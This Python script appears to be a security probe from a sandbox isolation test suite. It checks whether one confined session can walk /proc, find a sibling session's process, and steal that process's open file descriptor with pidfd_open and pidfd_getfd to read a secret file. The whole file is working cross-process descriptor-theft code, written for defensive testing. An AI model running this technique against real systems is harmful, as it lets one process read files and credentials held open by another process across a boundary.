#!/usr/bin/env python3
"""P14 cross-SESSION pidfd_getfd.

Session B holds an open fd to a file outside every write root and sleeps.
Session A (a DIFFERENT confined session/cgroup) walks /proc, finds B,
and steals the fd via pidfd_open + pidfd_getfd. If A reads B's secret,
the process-memory class's stated property ("the session is not a
privilege boundary from its own siblings without this") is false:
pidfd_getfd is that primitive and it is not blocked.
"""
import ctypes, os, sys, time, glob

libc = ctypes.CDLL("libc.so.6", use_errno=True)
def sy(nr, *a):
    ctypes.set_errno(0)
    args=[ctypes.c_long(x) if not isinstance(x,type(None)) else ctypes.c_void_p(None) for x in a]
    r=libc.syscall(ctypes.c_long(nr), *args)
    if r<0: return None, ctypes.get_errno()
    return r, 0
SYS_pidfd_open=434; SYS_pidfd_getfd=438

mode = sys.argv[1]            # "hold" or "steal"
secret = sys.argv[2]
mycgrp = open("/proc/self/cgroup").read().strip().split(":")[-1]

if mode == "hold":
    fd = os.open(secret, os.O_RDONLY)
    print("HOLDER pid=%d cgroup=%s fd=%d" % (os.getpid(), mycgrp, fd), flush=True)
    time.sleep(60)
    os._exit(0)

# steal mode: find a process whose cmdline contains probe-p14-xsession hold
me = os.getpid()
candidates = []
for p in glob.glob("/proc/[0-9]*"):
    pid = int(p.split("/")[-1])
    if pid == me:
        continue
    try:
        cmd = open(p + "/cmdline", "rb").read().decode(errors="replace")
    except OSError:
        continue
    if "probe-p14-xsession" in cmd and " hold" in cmd:
        candidates.append(pid)
print("candidates=%s (my cgroup=%s)" % (candidates, mycgrp))
for pid in candidates:
    pfd, err = sy(SYS_pidfd_open, pid, 0)
    if pfd is None:
        print("  pid %d pidfd_open=ERRNO-%d" % (pid, err)); continue
    # child fd is 3 (after stdin/out/err)
    for fdn in range(3, 12):
        gfd, err = sy(SYS_pidfd_getfd, pfd, fdn, 0)
        if gfd is None:
            continue
        try:
            data = os.read(gfd, 64)
        except OSError:
            continue
        if b"SECRET" in data:
            print("  STOLE pid %d fd %d -> %r" % (pid, fdn, data[:40]))
            print("CROSS-SESSION-FD-THEFT-CONFIRMED")
            os._exit(0)
print("no theft")
